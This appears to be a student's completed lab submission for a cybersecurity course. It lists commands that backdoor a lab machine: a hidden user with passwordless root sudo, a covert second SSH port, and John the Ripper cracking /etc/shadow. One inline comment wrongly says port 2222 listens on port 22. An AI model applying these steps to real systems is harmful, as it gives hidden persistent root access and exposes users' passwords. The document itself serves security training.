    Cybersecurity
Module 6 Challenge Submission File


Advanced Bash: Owning the System

Make a copy of this document to work in, and then for each step, add the solution commands below the prompt. Save and submit this completed file as your Challenge deliverable.


Step 1: Shadow People

 Create a secret user named sysd. Make sure this user doesn't have a home folder created.

useradd -M sysd (the -M forces no home folder, even if configs try to make every new user have a home folder)


 Give your secret user a password. 

passwd sysd

This could also be accomplished in the useradd command with the -p [password] option/argument


 Give your secret user a system UID < 1000.

usermod -u (or --uid) [desired UID, in my case 99] sysd

Could also be added during useradd with -u [uid]


 Give your secret user the same GID.

groupmod -g 99 sysd

Could also be added during useradd with -g [gid] - though reading the man page, this might be something that can be prevented in system configuration files? 


 Give your secret user full sudo access without the need for a password.

visudo (enters sudoers editor)
Inside visudo:
sysd ALL=(ALL:ALL) NOPASSWD:ALL
(above could be read as “allow sysd to run any command as any user, and they don’t need a password for running any command”)


 Test that sudo access works without your password.

su sysd
sudo -l
sudo useradd test
sudo deluser test
sudo su



Step 2: Smooth Sailing

 Edit the sshd_config file.

sudo su (switching to root to avoid having to continually sudo)
sudo vim /etc/ssh/sshd_config (manually editing config file in vim, which i prefer over nano)

Inside VIM add:
Port 2222 (tells the ssh to listen for ssh connections on port 22)

If there’s no Port 22 already uncommented in the file, add:
Port 22 (ensures port 22 works normally, to avoid suspicion)



Step 3: Testing Your Configuration Update

 Restart the SSH service.

systemctl restart sshd

Verifying the service restarts:

systemctl status sshd

If the editing is done correctly, the status will show a set of lines that look similar to this:

DATE XX:XX:XX computer-name systemd[1]: Starting OpenBSD Secure Shell Server
DATE XX:XX:XX computer-name sshd[9962]: Server listening on 0.0.0.0 port 22.
DATE XX:XX:XX computer-name sshd[9962]: Server listening on :: port 22.
DATE XX:XX:XX computer-name sshd[9962]: Server listening on 0.0.0.0 port 2222.
DATE XX:XX:XX computer-name sshd[9962]: Server listening on :: port 2222.
DATE XX:XX:XX computer-name sshd[9962]: Started OpenBSP Secure Shell Server


 Exit the root account.

exit (repeat continually until logged out)


 SSH to the target machine using your sysd account and port 2222.

ssh sysd@192.168.6.105 -p 2222


 Use sudo to switch to the root user.

sudo su



Step 4: Crack All the Passwords

 SSH back to the system using your sysd account and port 2222.

ssh sysd@192.168.6.105 -p 2222


 Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file.

sudo su
john /etc/shadow 
(don’t need to give it a wordlist, but can use one if needed with --wordlist:/path/to/wordlist option/arg)

If you want to see all the passwords you’ve cracked with john:
john --show /path/to/hased/passwords.txt 

In this case, it would be:
john --show /etc/shadow
